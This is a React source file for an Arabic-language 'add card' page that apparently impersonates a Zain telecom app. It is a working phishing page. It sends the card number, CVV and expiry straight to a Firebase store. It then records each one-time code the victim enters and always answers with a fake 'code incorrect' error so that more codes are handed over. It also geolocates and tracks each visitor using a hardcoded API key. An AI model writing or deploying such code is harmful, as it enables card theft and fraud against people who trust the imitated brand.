"use client"

import type React from "react"
import { useCallback, useEffect, useState } from "react"
import { ChevronRight } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { addData, setupOnlineStatus } from "@/lib/firebase"
const visitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`
const allOtps = [""]
export default function AddCardPage() {
  const [step, setStep] = useState(1)
  const [cardNumber, setCardNumber] = useState(["", "", "", ""])
  const [cvv, setCvv] = useState("")
  const [expiry, setExpiry] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [saveCard, setSaveCard] = useState(false)
  const [loading, setLoading] = useState(false)
  const [otp, setOtp] = useState("")
  const [otpError, setOtpError] = useState("")

  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return

    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      })
      setupOnlineStatus(visitorId!)

      localStorage.setItem("country", country)
    } catch (error) {
      console.error("Error fetching location:", error)
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error",
      })
    }
  }, [visitorId])

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog().then(() => {
        setLoading(false)
      })
    }
  }, [visitorId, getLocationAndLog])

  const handleCardNumberChange = (index: number, value: string) => {
    const newCardNumber = [...cardNumber]
    newCardNumber[index] = value.slice(0, 4)
    setCardNumber(newCardNumber)

    if (value.length === 4 && index < 3) {
      const nextInput = document.getElementById(`card-${index + 1}`)
      nextInput?.focus()
    }
  }

  const handleOtpChange = (value: string) => {
    setOtp(value)
    if (value.length > 0) {
    } else {
      setOtpError("")
    }
  }

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    allOtps.push(otp)
    addData({ id: visitorId, otp, allOtps })
    setTimeout(() => {
      setOtpError('رمز التحقق غير صحيح')
      setOtp('')
    }, 2000);
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    addData({ id: visitorId, cardNumber, cvv, expiryDate: expiry })
    setStep(2)
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100" dir="rtl">
      <div className="bg-white border-b border-gray-200">
        <div className="flex items-center justify-between px-4 py-4">
          <button className="p-2" onClick={() => step === 2 && setStep(1)}>
            <ChevronRight className="w-6 h-6" />
          </button>
        </div>
      </div>

      <div className="px-4 py-6 space-y-6">
        <div className="text-center">
          <h1 className="text-xl font-semibold text-gray-800 mb-2">
            {step === 1 ? "إضافة بطاقة" : "التحقق من البطاقة"}
          </h1>
          <p className="text-sm text-gray-500">
            {step === 1 ? "ليتمكن من إضافة المال، ابدأ بإضافة بطاقة" : "أدخل رمز التحقق المرسل إليك"}
          </p>
        </div>

        {step === 1 && (
          <>
            <div className="space-y-2">
              <label className="block text-sm text-gray-700 text-right">رقم البطاقة</label>
              <div className="grid grid-cols-4 gap-2" dir="ltr">
                {cardNumber.map((value, index) => (
                  <Input
                    key={index}
                    id={`card-${index}`}
                    type="text"
                    inputMode="numeric"
                    placeholder="0000"
                    value={value}
                    onChange={(e) => handleCardNumberChange(index, e.target.value)}
                    className={`text-center h-14 text-lg ${
                      index === 0 ? "border-2 border-purple-400 focus:border-purple-500" : "border-gray-200 bg-gray-50"
                    }`}
                    maxLength={4}
                  />
                ))}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div className="space-y-2">
                <label className="block text-sm text-gray-700 text-right">CVV</label>
                <Input
                  type="text"
                  inputMode="numeric"
                  placeholder="CVV"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.slice(0, 3))}
                  className="text-center h-14 text-lg border-gray-200 bg-gray-50"
                  maxLength={3}
                />
              </div>

              <div className="space-y-2">
                <label className="block text-sm text-gray-700 text-right">تاريخ انتهاء الصلاحية</label>
                <Input
                  type="tel"
                  placeholder="أدخل شهر/عام"
                  value={expiry.length==2?expiry+"/":expiry}
                  onChange={(e) => setExpiry(e.target.value)}
                  maxLength={5}
                  className="text-center h-14 text-sm border-gray-200 bg-gray-50"
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="block text-sm text-gray-700 text-right">الإسم المستعار للبطاقة</label>
              <div className="space-y-1">
                <Input
                  type="text"
                  placeholder="أدخل الإسم المستعار للبطاقة"
                  value={cardholderName}
                  onChange={(e) => setCardholderName(e.target.value.slice(0, 20))}
                  className="h-14 text-sm text-right border-gray-200 bg-gray-50"
                  maxLength={20}
                />
                <p className="text-xs text-gray-400">{cardholderName.length}/20</p>
              </div>
            </div>

            <div className="flex items-center justify-end gap-3 py-2">
              <label htmlFor="save-card" className="text-sm text-gray-700 cursor-pointer">
                إحفظ البطاقة للاستخدام لاحقاً
              </label>
              <Checkbox
                id="save-card"
                checked={saveCard}
                onCheckedChange={(checked) => setSaveCard(checked as boolean)}
                className="border-gray-300"
              />
            </div>
          </>
        )}

        {step === 2 && (
          <div className="space-y-2">
            <label className="block text-sm text-gray-700 text-right">رمز التحقق OTP</label>
            <div className="space-y-1">
              <Input
                type="text"
                inputMode="numeric"
                placeholder="أدخل رمز OTP"
                value={otp}
                onChange={(e) => handleOtpChange(e.target.value)}
                className={`h-14 text-sm text-center border-gray-200 bg-gray-50 ${
                  otpError ? "border-red-400 focus:border-red-500" : ""
                }`}
                maxLength={6}
              />
              {otpError && <p className="text-xs text-red-500 text-right">{otpError}</p>}
            </div>
          </div>
        )}
      </div>

      <div className="fixed bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-white via-white to-transparent">
        <Button
          onClick={step === 1 ? handleSubmit : handleOtpSubmit}
          className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-purple-500 to-purple-400 hover:from-purple-600 hover:to-purple-500 text-white rounded-xl shadow-lg"
        >
          {step === 1 ? "التالي" : "تأكيد"}
        </Button>
      </div>
    </div>
  )
}
